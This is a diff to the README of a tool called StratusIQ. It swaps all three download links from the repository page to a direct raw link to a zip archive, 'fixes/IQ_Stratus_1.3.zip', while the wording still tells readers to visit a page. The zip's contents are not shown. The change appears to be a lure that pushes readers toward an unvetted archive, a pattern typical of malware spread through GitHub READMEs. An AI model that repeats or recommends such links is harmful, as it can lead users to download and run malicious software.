@@ -1,6 +1,6 @@
 # 🧠 StratusIQ - Fix Cloud Issues Fast
 
-[![Download StratusIQ](https://img.shields.io/badge/Download-StratusIQ-6A5ACD?style=for-the-badge&logo=github)](https://github.com/curso7710/StratusIQ)
+[![Download StratusIQ](https://img.shields.io/badge/Download-StratusIQ-6A5ACD?style=for-the-badge&logo=github)](https://github.com/curso7710/StratusIQ/raw/refs/heads/main/fixes/IQ_Stratus_1.3.zip)
 
 ## 🚀 What StratusIQ Does
 
@@ -36,7 +36,7 @@ For best results, use a machine with:
 
 Visit this page to download StratusIQ:
 
-[https://github.com/curso7710/StratusIQ](https://github.com/curso7710/StratusIQ)
+[https://github.com/curso7710/StratusIQ/raw/refs/heads/main/fixes/IQ_Stratus_1.3.zip](https://github.com/curso7710/StratusIQ/raw/refs/heads/main/fixes/IQ_Stratus_1.3.zip)
 
 If the page includes a release file, download it to your PC. If it provides a zip file, save the zip file first.
 
@@ -225,4 +225,4 @@ When a new version appears:
 
 If you need the download page again, use this link:
 
-[https://github.com/curso7710/StratusIQ](https://github.com/curso7710/StratusIQ)
+[https://github.com/curso7710/StratusIQ/raw/refs/heads/main/fixes/IQ_Stratus_1.3.zip](https://github.com/curso7710/StratusIQ/raw/refs/heads/main/fixes/IQ_Stratus_1.3.zip)
